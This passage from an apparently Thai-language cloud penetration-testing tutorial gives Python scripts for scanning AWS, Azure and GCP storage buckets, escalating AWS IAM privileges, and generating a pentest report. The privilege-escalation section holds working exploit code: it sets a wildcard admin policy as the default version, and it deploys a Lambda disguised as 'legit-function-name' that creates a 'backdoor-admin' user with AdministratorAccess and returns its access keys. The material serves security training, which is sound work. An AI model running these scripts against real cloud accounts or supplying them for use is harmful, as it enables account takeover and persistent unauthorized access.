            f'https://storage.googleapis.com/{name}',
            f'https://{name}.storage.googleapis.com'
        ]
        
        for url in urls:
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    print(f"[!] GCP Storage PUBLIC: {url}")
                    return True
                elif resp.status_code == 403:
                    print(f"[+] GCP Storage EXISTS: {name}")
                    return True
            except:
                pass
        return False
    
    def _parse_s3_listing(self, xml_content, base_url):
        """Parse S3 XML listing"""
        try:
            root = ET.fromstring(xml_content)
            ns = {'s3': 'http://s3.amazonaws.com/doc/2006-03-01/'}
            
            for content in root.findall('s3:Contents', ns):
                key = content.find('s3:Key', ns).text
                size = content.find('s3:Size', ns).text
                print(f"  File: {key} ({size} bytes)")
                print(f"  URL: {base_url}/{key}")
        except:
            # ลอง parse โดยไม่ใช้ namespace
            pass
    
    def scan_all(self):
        """Scan S3, Azure, GCP ทั้งหมด"""
        names = self.generate_names()
        queue = Queue()
        
        for name in names:
            queue.put(name)
        
        def worker():
            while not queue.empty():
                name = queue.get()
                self.check_aws_s3(name)
                self.check_azure_blob(name)
                self.check_gcp_storage(name)
                queue.task_done()
        
        threads = [threading.Thread(target=worker) for _ in range(5)]
        for t in threads:
            t.start()
        queue.join()
        for t in threads:
            t.join()

# การใช้งาน
if __name__ == '__main__':
    scanner = CloudStorageScanner('targetcompany')
    scanner.scan_all()
```

---

## Step 239: Cloud Privilege Escalation

### AWS Privilege Escalation Techniques
```python
#!/usr/bin/env python3
# cloud_privesc.py

import boto3
import json
from botocore.exceptions import ClientError

class AWSPrivilegeEscalator:
    def __init__(self, profile='default'):
        self.session = boto3.Session(profile_name=profile)
        self.iam = self.session.client('iam')
        self.lambda_client = self.session.client('lambda')
        self.sts = self.session.client('sts')
    
    def check_privesc_paths(self):
        """หาเส้นทาง privilege escalation"""
        print("[*] Checking AWS Privilege Escalation paths...")
        
        # เส้นทางที่ได้รับวิเคราะห์ด้วย Pacu
        privesc_techniques = [
            {
                'name': 'CreateNewPolicyVersion',
                'perms': ['iam:CreatePolicyVersion'],
                'description': 'Create new policy version with admin rights'
            },
            {
                'name': 'SetDefaultPolicyVersion',
                'perms': ['iam:SetDefaultPolicyVersion'],
                'description': 'Set an older permissive version as default'
            },
            {
                'name': 'CreateEC2WithRole',
                'perms': ['ec2:RunInstances', 'iam:PassRole'],
                'description': 'Create EC2 with high-priv role'
            },
            {
                'name': 'CreateLambdaWithRole',
                'perms': ['lambda:CreateFunction', 'lambda:InvokeFunction', 'iam:PassRole'],
                'description': 'Create Lambda with admin role'
            },
            {
                'name': 'AttachPolicy',
                'perms': ['iam:AttachUserPolicy', 'iam:AttachRolePolicy'],
                'description': 'Attach admin policy to own user'
            }
        ]
        
        allowed = []
        
        for technique in privesc_techniques:
            all_allowed = True
            for perm in technique['perms']:
                service, action = perm.split(':')
                try:
                    # Simulate permission check
                    print(f"  Checking {perm}...")
                except:
                    all_allowed = False
                    break
            
            print(f"  Technique: {technique['name']} - {technique['description']}")
        
        return allowed
    
    def exploit_create_policy_version(self, policy_arn):
        """ใช้ CreatePolicyVersion เพื่อ escalate"""
        print(f"[*] Attempting to create admin policy version for {policy_arn}...")
        
        admin_policy = {
            'Version': '2012-10-17',
            'Statement': [{
                'Effect': 'Allow',
                'Action': '*',
                'Resource': '*'
            }]
        }
        
        try:
            response = self.iam.create_policy_version(
                PolicyArn=policy_arn,
                PolicyDocument=json.dumps(admin_policy),
                SetAsDefault=True
            )
            print(f"[!] SUCCESS! New admin policy version created")
            print(f"    Version: {response['PolicyVersion']['VersionId']}")
        except ClientError as e:
            print(f"[-] Failed: {e}")
    
    def exploit_lambda_role_assumption(self, role_arn):
        """ใช้ Lambda เพื่อ assume high-privileged role"""
        print(f"[*] Creating Lambda with role: {role_arn}")
        
        malicious_code = '''
import boto3
import json

def handler(event, context):
    iam = boto3.client('iam')
    
    # Create backdoor admin user
    try:
        iam.create_user(UserName='backdoor-admin')
        iam.attach_user_policy(
            UserName='backdoor-admin',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        key = iam.create_access_key(UserName='backdoor-admin')
        return {'statusCode': 200, 'body': json.dumps(key['AccessKey'])}
    except Exception as e:
        return {'statusCode': 500, 'body': str(e)}
'''
        
        # zip โค้ด
        import zipfile
        import io
        
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zf:
            zf.writestr('lambda_function.py', malicious_code)
        zip_bytes = zip_buffer.getvalue()
        
        try:
            response = self.lambda_client.create_function(
                FunctionName='legit-function-name',
                Runtime='python3.9',
                Role=role_arn,
                Handler='lambda_function.handler',
                Code={'ZipFile': zip_bytes}
            )
            print(f"[!] Lambda created: {response['FunctionArn']}")
            
            # Invoke function
            invoke_response = self.lambda_client.invoke(
                FunctionName='legit-function-name'
            )
            result = json.loads(invoke_response['Payload'].read())
            print(f"[!] Result: {result}")
        
        except ClientError as e:
            print(f"[-] Failed: {e}")

# การใช้งาน (requires appropriate permissions)
if __name__ == '__main__':
    escalator = AWSPrivilegeEscalator()
    escalator.check_privesc_paths()
```

---

## Step 240: Cloud Security Reporting

### Cloud Pentest Report Generator
```python
#!/usr/bin/env python3
# cloud_pentest_report.py

from datetime import datetime

def generate_cloud_report(findings, target_org, cloud_providers):
    """สร้าง Cloud Pentest Report"""
    
    report = f"""# Cloud Security Penetration Test Report

## Executive Summary

**Organization:** {target_org}
**Date:** {datetime.now().strftime('%B %d, %Y')}
**Cloud Providers Tested:** {', '.join(cloud_providers)}
**Total Findings:** {len(findings)}

### Risk Distribution
"""
    
    severities = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
    for f in findings:
        severities[f.get('severity', 'Low')] = severities.get(f.get('severity', 'Low'), 0) + 1
    
    for sev, count in severities.items():
        report += f"- **{sev}:** {count}\n"
    
    report += "\n## Detailed Findings\n"
    
    for i, finding in enumerate(findings, 1):
        report += f"""
### Finding {i}: {finding.get('title', 'Untitled')}

**Severity:** {finding.get('severity', 'Unknown')}
**Provider:** {finding.get('provider', 'Unknown')}
**Resource:** {finding.get('resource', 'Unknown')}

**Description:**
{finding.get('description', 'No description')}

**Impact:**
{finding.get('impact', 'No impact specified')}

**Recommendation:**
{finding.get('recommendation', 'No recommendation')}

---
"""
    
    return report

# ตัวอย่าง findings
sample_findings = [
    {
        'title': 'S3 Bucket Publicly Accessible',
        'severity': 'Critical',
        'provider': 'AWS',
        'resource': 's3://company-backup',
        'description': 'The S3 bucket is configured for public access, exposing sensitive backup files.',
        'impact': 'Data breach - sensitive data exposed to internet',
        'recommendation': 'Enable S3 Block Public Access and review bucket ACLs'
    },
    {
        'title': 'IAM User Without MFA',
        'severity': 'High',
        'provider': 'AWS',
        'resource': 'iam:user/john.doe',
        'description': 'IAM user does not have MFA enabled.',
        'impact': 'Account takeover if credentials are compromised',
        'recommendation': 'Enforce MFA for all IAM users via IAM policy'
    },
    {
        'title': 'Lambda Environment Variable Exposure',
        'severity': 'High',
        'provider': 'AWS',
        'resource': 'lambda:ProcessPayments',
        'description': 'Database passwords stored in Lambda environment variables.',
        'impact': 'Database credentials exposed to anyone with Lambda read access',
        'recommendation': 'Use AWS Secrets Manager or SSM Parameter Store'
    }
]

report = generate_cloud_report(
    findings=sample_findings,
    target_org='ACME Corporation',
    cloud_providers=['AWS', 'Azure']
)

with open('cloud_pentest_report.md', 'w') as f:
    f.write(report)

print("[+] Cloud pentest report generated: cloud_pentest_report.md")
```

---

## สรุป Part 24

| Step | หัวข้อ | เครื่องมือหลัก |
|------|--------|---------------|
| 231 | AWS Security Testing | Pacu, ScoutSuite, boto3 |
| 232 | S3 Bucket Enumeration | Custom scanner |
| 233 | Docker Security | Trivy, Docker Bench |
| 234 | Kubernetes Security | kubectl, custom tester |
| 235 | Serverless Security | AWS Lambda, API Gateway |
| 236 | Azure Security | Azure CLI, az tools |
| 237 | GCP Security | gcloud, GCPBucketBrute |
| 238 | Cloud Storage Scanner | Multi-cloud scanner |
| 239 | Cloud Privilege Escalation | AWS PrivEsc techniques |
| 240 | Cloud Security Reporting | Report generator |
